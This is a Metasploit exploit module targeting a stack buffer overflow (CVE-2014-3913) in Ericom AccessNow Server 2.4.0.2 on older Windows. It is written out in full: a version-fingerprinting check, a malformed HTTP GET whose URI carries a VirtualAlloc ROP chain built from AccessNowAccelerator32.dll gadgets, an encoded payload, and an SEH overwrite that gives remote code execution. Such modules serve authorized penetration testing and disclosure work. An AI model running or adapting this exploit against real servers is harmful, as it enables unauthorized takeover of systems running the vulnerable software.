# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ericom AccessNow Server Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a stack based buffer overflow in Ericom AccessNow Server. The
        vulnerability is due to an insecure usage of vsprintf with user controlled data,
        which can be triggered with a malformed HTTP request. This module has been tested
        successfully with Ericom AccessNow Server 2.4.0.2 on Windows XP SP3 and Windows 2003
        Server SP2.
      },
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;, # Vulnerability Discovery
          &#039;juan vazquez&#039;, # Metasploit Module
        ],
      &#039;References&#039;     =>
        [
          [&#039;ZDI&#039;, &#039;14-160&#039;],
          [&#039;CVE&#039;, &#039;2014-3913&#039;],
          [&#039;BID&#039;, &#039;67777&#039;],
          [&#039;URL&#039;,&#039;http://www.ericom.com/security-ERM-2014-610.asp&#039;]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 4096,
          &#039;BadChars&#039; => "\x00\x0d\x0a",
          &#039;DisableNops&#039; => true,
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Ericom AccessNow Server 2.4.0.2 / Windows [XP SP3 / 2003 SP2]&#039;,
            {
              &#039;RopOffset&#039; => 62,
              &#039;Offset&#039; => 30668,
              &#039;Ret&#039; => 0x104da1e5 # 0x104da1e5 {pivot 1200 / 0x4b0} # ADD ESP,4B0 # RETN # From AccessNowAccelerator32.dll
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Jun 2 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([Opt::RPORT(8080)], self.class)
  end


  def check
    res = send_request_cgi({
      &#039;uri&#039; => &#039;/AccessNow/start.html&#039;
    })

    unless res && res.code == 200 && res.headers[&#039;Server&#039;]
      return Exploit::CheckCode::Safe
    end

    if res.headers[&#039;Server&#039;] =~ /Ericom AccessNow Server/
      return Exploit::CheckCode::Appears # Ericom AccessNow 2.4
    elsif res && res.code == 200 && res.headers[&#039;Server&#039;] && res.headers[&#039;Server&#039;] =~ /Ericom Access Server/
      return Exploit::CheckCode::Detected # Ericom AccessNow 3
    end

    Exploit::CheckCode::Unknown
  end

  def exploit_uri
    uri = "#{rand_text_alpha(1)} " # To ensure a "malformed request" error message
    uri << rand_text(target[&#039;RopOffset&#039;])
    uri << create_rop_chain
    uri << payload.encoded
    uri << rand_text(target[&#039;Offset&#039;] - uri.length)
    uri << rand_text(4) # nseh
    uri << [target.ret].pack("V") # seh

    uri
  end

  def exploit
    print_status("#{peer} - Sending malformed request...")
    send_request_raw({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => exploit_uri,
      &#039;encode&#039;  => false
    }, 1)
  end

  def create_rop_chain
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
      [
        0x10518867, # RETN # [AccessNowAccelerator32.dll] # Padding to ensure it works in both windows 2003 SP2 and XP SP3
        0x10518867, # RETN # [AccessNowAccelerator32.dll] # Padding to ensure it works in both windows 2003 SP2 and XP SP3
        0x10518866, # POP EAX # RETN [AccessNowAccelerator32.dll]
        0x105c6294, # ptr to &VirtualAlloc() [IAT AccessNowAccelerator32.dll]
        0x101f292b, # MOV EAX,DWORD PTR DS:[EAX] # RETN [AccessNowAccelerator32.dll]
        0x101017e6, # XCHG EAX,ESI # RETN [AccessNowAccelerator32.dll]
        0x103ba89c, # POP EBP # RETN [AccessNowAccelerator32.dll]
        0x103eed74, # & jmp esp [AccessNowAccelerator32.dll]
        0x1055dac2, # POP EAX # RETN [AccessNowAccelerator32.dll]
        0xffffffff, # Value to negate, will become 0x00000001
        0x1052f511, # NEG EAX # RETN [AccessNowAccelerator32.dll]
        0x10065f69, # XCHG EAX,EBX # RETN [AccessNowAccelerator32.dll]
        0x10074429, # POP EAX # RETN [AccessNowAccelerator32.dll]
        0xfbdbcb75, # put delta into eax (-> put 0x00001000 into edx)
        0x10541810, # ADD EAX,424448B # RETN [AccessNowAccelerator32.dll]
        0x1038e58a, # XCHG EAX,EDX # RETN [AccessNowAccelerator32.dll]
        0x1055d604, # POP EAX # RETN [AccessNowAccelerator32.dll]
        0xffffffc0, # Value to negate, will become 0x00000040
        0x10528db3, # NEG EAX # RETN [AccessNowAccelerator32.dll]
        0x1057555d, # XCHG EAX,ECX # RETN [AccessNowAccelerator32.dll]
        0x1045fd24, # POP EDI # RETN [AccessNowAccelerator32.dll]
        0x10374022, # RETN (ROP NOP) [AccessNowAccelerator32.dll]
        0x101f25d4, # POP EAX # RETN [AccessNowAccelerator32.dll]
        0x90909090, # nop
        0x1052cfce  # PUSHAD # RETN [AccessNowAccelerator32.dll]
      ].pack("V*")

    rop_gadgets
  end

end

